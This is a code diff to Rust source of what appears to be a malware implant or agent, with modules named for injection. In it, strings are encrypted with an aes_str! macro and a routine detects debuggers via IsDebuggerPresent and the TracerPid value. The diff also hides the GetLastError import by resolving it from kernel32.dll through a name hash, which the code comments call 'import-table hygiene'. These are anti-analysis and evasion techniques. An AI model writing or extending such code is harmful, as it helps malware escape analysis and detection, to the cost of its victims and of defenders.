@@ -30,26 +30,31 @@ pub fn register(engine: &mut Engine) {
     // ── Debugger detection ────────────────────────────────────────────────────
 
     engine.register_fn(&aes_str!("internal_debugger_detect"), || -> String {
-        let detected: bool = {
-            #[cfg(target_os = "windows")]
-            { unsafe { use super::win_ffi::proc_ext::IsDebuggerPresent; IsDebuggerPresent() != 0 } }
-            #[cfg(target_os = "linux")]
-            {
-                std::fs::read_to_string(aes_str!("/proc/self/status"))
-                    .ok()
-                    .and_then(|s| {
-                        s.lines()
-                            .find(|l| l.starts_with(aes_str!("TracerPid:").as_str()))
-                            .and_then(|l| l.split_whitespace().nth(1))
-                            .and_then(|v| v.parse::<i64>().ok())
-                    })
-                    .map(|pid| pid != 0)
-                    .unwrap_or(false)
-            }
-            #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-            false
-        };
-        if detected { aes_str!("true") } else { aes_str!("false") }
+        // No detection is implemented outside Windows/Linux - say so instead
+        // of reporting a hard "false" that scripts would read as "clean".
+        #[cfg(not(any(target_os = "windows", target_os = "linux")))]
+        return aes_str!("unsupported");
+        #[cfg(any(target_os = "windows", target_os = "linux"))]
+        {
+            let detected: bool = {
+                #[cfg(target_os = "windows")]
+                { unsafe { use super::win_ffi::proc_ext::IsDebuggerPresent; IsDebuggerPresent() != 0 } }
+                #[cfg(target_os = "linux")]
+                {
+                    std::fs::read_to_string(aes_str!("/proc/self/status"))
+                        .ok()
+                        .and_then(|s| {
+                            s.lines()
+                                .find(|l| l.starts_with(aes_str!("TracerPid:").as_str()))
+                                .and_then(|l| l.split_whitespace().nth(1))
+                                .and_then(|v| v.parse::<i64>().ok())
+                        })
+                        .map(|pid| pid != 0)
+                        .unwrap_or(false)
+                }
+            };
+            if detected { aes_str!("true") } else { aes_str!("false") }
+        }
     });
 
     // ── Parent process check ──────────────────────────────────────────────────
@@ -116,7 +121,14 @@ pub fn register(engine: &mut Engine) {
                 use super::win_ffi::proc_ext::*;
                 let h = CreateMutexA(std::ptr::null_mut(), 1, cname.as_ptr());
                 if h.is_null() { return aes_str!("false"); }
-                extern "system" { fn GetLastError() -> u32; }
+                // Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+                unsafe fn GetLastError() -> u32 {
+                    type F = unsafe extern "system" fn() -> u32;
+                    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+                    let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetLastError")));
+                    let f: F = unsafe { std::mem::transmute(p) };
+                    unsafe { f() }
+                }
                 let err = GetLastError();
                 // ERROR_ALREADY_EXISTS = 183
                 if err == 183 {
